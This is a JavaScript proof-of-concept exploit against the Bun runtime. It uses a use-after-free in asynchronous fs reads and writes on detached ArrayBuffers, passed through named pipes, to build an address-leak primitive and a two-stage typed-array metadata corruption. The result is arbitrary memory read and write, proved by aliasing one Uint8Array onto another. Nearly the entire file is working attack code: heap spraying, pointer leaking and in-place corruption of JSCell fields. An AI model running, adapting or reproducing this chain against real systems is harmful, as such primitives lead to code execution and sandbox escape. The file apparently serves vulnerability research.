// Use the no-FFI addrof -> ArrayBuffer-metadata bridge to patch a real
// Uint8Array cell's m_vector field in place. This bypasses fake-cell allocation
// class issues: the JSCell is real and heap-valid, only its data pointer is
// temporarily retargeted.
//
// Expected proof:
//   1. Build the two-stage metadata bridge.
//   2. Leak addrof(rwView) and addrof(targetView).
//   3. Read both typed-array cells; offset 16 is m_vector, offset 24 is length.
//   4. Write targetView.m_vector + SHIFT into rwView.m_vector.
//   5. rwView[0] aliases targetView[SHIFT]; rwView writes change targetView.
//   6. Restore rwView's original m_vector / length.
//
// No bun:ffi, no native helper dylib, no symbol lookup, no JIT warming.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const addrofSize = Number(process.env.ADDROF_SIZE || 8192);
const addrofSlots = Number(process.env.ADDROF_SLOTS || 1024);
const addrofSprayCount = Number(process.env.ADDROF_SPRAY_COUNT || 4096);
const addrofElementOffset = Number(process.env.ADDROF_ELEMENT_OFFSET || 144);
const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 16384);
const bridgeAttempts = Number(process.env.BRIDGE_ATTEMPTS || 64);
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const dataPtrOffset = Number(process.env.DATA_PTR_OFFSET || 16);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || (1 << 20));
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const shift = Number(process.env.SHIFT || 17);
const aliasWrite = Number(process.env.ALIAS_WRITE || 0x5a) & 0xff;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}
function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}
function hex(value, width = 16) { return `0x${value.toString(16).padStart(width, "0")}`; }
function isPointerLike(v) {
  return v >= 0x0000100000000000n && v <= 0x00007ffffffffffen && (v & 0x7n) === 0n;
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-real-vector-arw-${label}-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo: ${mk.status}`);
  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}
function closeFifo(f) {
  for (const fd of [f.writeFd, f.fillFd, f.readFd]) { try { fs.closeSync(fd); } catch {} }
  try { fs.unlinkSync(f.path); } catch {}
}
function isAgain(e) { return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK"; }
function fillFifo(f) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(f.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (e) { if (isAgain(e)) break; throw e; }
  }
  if (filled === 0) throw new Error("fifo fill failed");
  return filled;
}
async function readExact(f, n, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, n)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;
  while (total < n) {
    try {
      const got = fs.readSync(f.readFd, scratch, 0, Math.min(scratch.length, n - total), null);
      if (got > 0) { chunks.push(Buffer.from(scratch.subarray(0, got))); total += got; continue; }
    } catch (e) { if (!isAgain(e)) throw e; }
    if (Date.now() >= deadline) throw new Error(`timed out ${label}`);
    await sleep(1);
  }
  return Buffer.concat(chunks, total);
}
function readU64LEBytes(buf, off) {
  let v = 0n;
  for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(buf[off + i] || 0);
  return v;
}
function writeU64LE(view, off, value) {
  let v = value;
  for (let i = 0; i < 8; i++) { view[off + i] = Number(v & 0xffn); v >>= 8n; }
}
function payloadU64(value) {
  const out = Buffer.alloc(8);
  writeU64LE(out, 0, value);
  return out;
}

async function addrof(target) {
  const fifo = makeFifo("addrof");
  const retained = [];
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(addrofSize);
    const source = new Uint8Array(ab);
    source.fill(0x51);
    const done = new Promise((r) => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bw) => r({ err, bw }));
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < addrofSprayCount; i++) {
      const arr = new Array(addrofSlots);
      for (let j = 0; j < addrofSlots; j++) arr[j] = target;
      retained.push(arr);
    }
    gcNow();
    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, addrofSize, "addrof");
    await done;
    return readU64LEBytes(leaked, addrofElementOffset);
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

let liveCarriers = [];
function makeCarriers() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const view = new Uint8Array(new ArrayBuffer(viewSize));
    view.fill((0x71 + (i & 15)) & 0xff);
    out.push(view);
  }
  return out;
}
async function corruptBridge(targetAddress) {
  const path = join(tmpdir(), `bun-real-vector-arw-write-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo: ${mk.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);
  try {
    const ab = new ArrayBuffer(uafSize);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise((r) => {
      fs.read(fd, target, writeOffset, 8, null, (err, bytesRead) => r({ err, bytesRead }));
    });
    detach(ab);
    gcNow();
    const carriers = makeCarriers();
    liveCarriers.push(carriers);
    gcNow();
    fs.writeSync(fd, payloadU64(targetAddress), 0, 8);
    await done;
    return carriers;
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}
function findMetadataBridge(carriers) {
  for (let i = 0; i < carriers.length; i++) {
    const c = carriers[i];
    let fresh;
    try { fresh = new Uint8Array(c.buffer); } catch { continue; }
    if (fresh.length !== viewSize) continue;
    const expectedFill = (0x71 + (i & 15)) & 0xff;
    let differs = false;
    for (let k = 0; k < 8; k++) if (fresh[k] !== expectedFill) { differs = true; break; }
    if (differs) return { index: i, fresh, carrier: c };
  }
  return null;
}

console.error(JSON.stringify({ phase: "start", shift, aliasWrite }));

const victimBuffer = new ArrayBuffer(viewSize);
new Uint8Array(victimBuffer).fill(0xa0);
const victimAddr = await addrof(victimBuffer);
console.error(JSON.stringify({ phase: "victim-addrof", victimAddr: hex(victimAddr) }));

let bridge1 = null;
for (let attempt = 0; attempt < bridgeAttempts; attempt++) {
  const carriers = await corruptBridge(victimAddr);
  bridge1 = findMetadataBridge(carriers);
  if (bridge1) {
    console.error(JSON.stringify({ phase: "stage1", attempt, bridgeIndex: bridge1.index }));
    break;
  }
}
if (!bridge1) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "stage1" }));
  process.exit(1);
}

const metadataAddr = readU64LEBytes(bridge1.fresh, dataPtrOffset);
console.error(JSON.stringify({ phase: "metadata-addr", metadataAddr: hex(metadataAddr) }));
if (!isPointerLike(metadataAddr)) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "metadata not pointer-like", metadataAddr: hex(metadataAddr) }));
  process.exit(1);
}

let bridge2 = null;
for (let attempt = 0; attempt < bridgeAttempts; attempt++) {
  const carriers = await corruptBridge(metadataAddr);
  bridge2 = findMetadataBridge(carriers);
  if (bridge2) {
    console.error(JSON.stringify({ phase: "stage2", attempt, bridgeIndex: bridge2.index }));
    break;
  }
}
if (!bridge2) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "stage2" }));
  process.exit(1);
}

const originalDataPtr = Buffer.from(bridge2.fresh.subarray(dataPtrOffset, dataPtrOffset + 8));
function restoreBridge() {
  for (let i = 0; i < 8; i++) bridge2.fresh[dataPtrOffset + i] = originalDataPtr[i];
}
async function bridgeRead(addr, n) {
  writeU64LE(bridge2.fresh, dataPtrOffset, addr);
  let bytes;
  let err = null;
  try {
    const view = new Uint8Array(victimBuffer);
    bytes = [...view.subarray(0, n)];
  } catch (e) { err = e?.message || String(e); }
  restoreBridge();
  if (err) throw new Error(err);
  return bytes;
}
async function bridgeWrite(addr, bytes) {
  writeU64LE(bridge2.fresh, dataPtrOffset, addr);
  let err = null;
  try {
    const view = new Uint8Array(victimBuffer);
    view.set(bytes, 0);
  } catch (e) { err = e?.message || String(e); }
  restoreBridge();
  if (err) throw new Error(err);
}

const rwView = new Uint8Array(8);
rwView.fill(0xcc);
const targetView = new Uint8Array(new ArrayBuffer(64));
for (let i = 0; i < targetView.length; i++) targetView[i] = (0x30 + i) & 0xff;

const rwCellAddr = await addrof(rwView);
const targetCellAddr = await addrof(targetView);
const rwPrefix = await bridgeRead(rwCellAddr, 32);
const targetPrefix = await bridgeRead(targetCellAddr, 32);
const rwVector = readU64LEBytes(rwPrefix, 16);
const rwLength = readU64LEBytes(rwPrefix, 24);
const targetVector = readU64LEBytes(targetPrefix, 16);
const targetLength = readU64LEBytes(targetPrefix, 24);
const aliasAddr = targetVector + BigInt(shift);

console.error(JSON.stringify({
  phase: "typedarray-cells",
  rwCellAddr: hex(rwCellAddr),
  rwVector: hex(rwVector),
  rwLength: hex(rwLength),
  targetCellAddr: hex(targetCellAddr),
  targetVector: hex(targetVector),
  targetLength: hex(targetLength),
  aliasAddr: hex(aliasAddr),
}));

let aliasReadBefore;
let targetBefore;
let aliasReadAfter;
let targetAfter;
let restoreVector;
let restoreLength;
let rwPrefixAfterRestore;
let bridgeError = null;

try {
  await bridgeWrite(rwCellAddr + 16n, payloadU64(aliasAddr));
  await bridgeWrite(rwCellAddr + 24n, payloadU64(8n));

  aliasReadBefore = rwView[0];
  targetBefore = targetView[shift];
  rwView[0] = aliasWrite;
  aliasReadAfter = rwView[0];
  targetAfter = targetView[shift];
} catch (e) {
  bridgeError = e?.message || String(e);
} finally {
  try { await bridgeWrite(rwCellAddr + 16n, payloadU64(rwVector)); } catch (e) { bridgeError ||= `restore-vector:${e?.message || String(e)}`; }
  try { await bridgeWrite(rwCellAddr + 24n, payloadU64(rwLength)); } catch (e) { bridgeError ||= `restore-length:${e?.message || String(e)}`; }
}

try {
  rwPrefixAfterRestore = await bridgeRead(rwCellAddr, 32);
  restoreVector = readU64LEBytes(rwPrefixAfterRestore, 16);
  restoreLength = readU64LEBytes(rwPrefixAfterRestore, 24);
} catch (e) {
  bridgeError ||= `post-restore-read:${e?.message || String(e)}`;
}

const ok =
  !bridgeError &&
  isPointerLike(rwCellAddr) &&
  isPointerLike(targetCellAddr) &&
  isPointerLike(rwVector) &&
  isPointerLike(targetVector) &&
  aliasReadBefore === targetBefore &&
  aliasReadAfter === aliasWrite &&
  targetAfter === aliasWrite &&
  restoreVector === rwVector &&
  restoreLength === rwLength;

console.log(JSON.stringify({
  phase: "summary",
  ok,
  bridge: {
    victimAddr: hex(victimAddr),
    metadataAddr: hex(metadataAddr),
    dataPtrOffset,
  },
  typedArrayOffsets: {
    vector: 16,
    length: 24,
  },
  rwCellAddr: hex(rwCellAddr),
  rwVector: hex(rwVector),
  rwLength: hex(rwLength),
  targetCellAddr: hex(targetCellAddr),
  targetVector: hex(targetVector),
  targetLength: hex(targetLength),
  shift,
  aliasAddr: hex(aliasAddr),
  aliasReadBefore,
  targetBefore,
  aliasWrite,
  aliasReadAfter,
  targetAfter,
  restoreVector: restoreVector !== undefined ? hex(restoreVector) : undefined,
  restoreLength: restoreLength !== undefined ? hex(restoreLength) : undefined,
  bridgeError,
  rwPrefixHex: Buffer.from(rwPrefix).toString("hex"),
  targetPrefixHex: Buffer.from(targetPrefix).toString("hex"),
  rwPrefixAfterRestoreHex: rwPrefixAfterRestore ? Buffer.from(rwPrefixAfterRestore).toString("hex") : undefined,
}, null, 2));

process.exit(ok ? 86 : 1);
